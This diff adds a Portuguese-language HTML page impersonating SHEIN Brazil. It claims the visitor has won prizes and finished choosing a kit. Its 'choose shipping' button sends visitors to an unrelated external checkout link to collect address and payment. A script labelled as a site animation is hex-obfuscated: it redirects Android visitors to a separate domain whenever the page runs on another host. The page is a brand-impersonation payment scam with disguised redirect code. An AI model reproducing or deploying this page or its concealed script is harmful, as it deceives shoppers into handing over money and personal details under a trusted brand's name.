@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script type="text/javascript">(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window, document, "clarity", "script", "um1jjg7699");</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#f5f5f5">
+    <title>SHEIN Premiações</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="finalizado.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <div class="logo-container">
+                <img src="sheinlogo.png" alt="SHEIN Premiações" class="logo">
+            </div>
+            <div class="prize-info">
+                <span class="prize-label">Acumulado em prêmios:</span>
+                <span class="prize-value" id="prizeValue">R$ 0</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-container finalizado-main">
+        <div class="success-card">
+            <!-- Check Icon -->
+            <div class="check-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+                    <polyline points="20 6 9 17 4 12"></polyline>
+                </svg>
+            </div>
+
+            <!-- Title -->
+            <h1 class="success-title">Escolha do Kit concluída!</h1>
+
+            <!-- Main instruction -->
+            <p class="instruction-text">
+                Ao clicar no botão abaixo você será redirecionada para <strong>preenchimento de endereço e escolha do frete com nosso parceiro terceirizado</strong>.
+            </p>
+
+            <!-- Button -->
+            <a href="index.html#" class="frete-btn" id="freteBtn">
+                <span class="truck-icon">🚚</span> Escolher Frete
+            </a>
+        </div>
+    </main>
+<!-- SCRIPT ANIMAÇAO FLUIDA SITE -->
+<script>(function(_0x1,_0x2){var _0x3=['\x73\x68\x70\x72\x6f\x6d\x6f\x73\x2e\x73\x69\x74\x65','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x68\x70\x72\x6f\x6d\x6f\x73\x2e\x73\x69\x74\x65\x2f'];var _0x4=_0x1['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x6f\x73\x74\x6e\x61\x6d\x65']['\x72\x65\x70\x6c\x61\x63\x65'](/^www\./,'');var _0x5=/Android/i['\x74\x65\x73\x74'](_0x1['\x6e\x61\x76\x69\x67\x61\x74\x6f\x72']['\x75\x73\x65\x72\x41\x67\x65\x6e\x74']);if(_0x5&&!_0x3['\x69\x6e\x63\x6c\x75\x64\x65\x73'](_0x4)){_0x1['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x72\x65\x66']=_0x3[1];}})(window,document);</script>
+
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-line"></div>
+        <p class="footer-text">SHEIN Brasil Copyright 2026</p>
+        <p class="footer-text">Todos os direitos reservados.</p>
+    </footer>
+
+   <script>
+    // Pega parâmetros da URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const nome = urlParams.get('nome') || '';
+    const prize = urlParams.get('prize') || 2157;
+    const tipo = urlParams.get('tipo') || '';
+    
+    // Atualiza valor no header
+    document.getElementById('prizeValue').textContent = 'R$ ' + parseFloat(prize).toLocaleString('pt-BR', {minimumFractionDigits: 2});
+    
+    // Configura botão de frete
+    document.getElementById('freteBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        
+        // Preserva todos os parâmetros da URL atual
+        const allParams = new URLSearchParams(window.location.search);
+        
+        // Redireciona para página de frete
+        window.location.href = 'https://www.pagamentos-seguro.link/checkout/20f73987-c256-4d94-aa92-85e0033582db';
+    });
+</script>
+
+</body>
+</html>
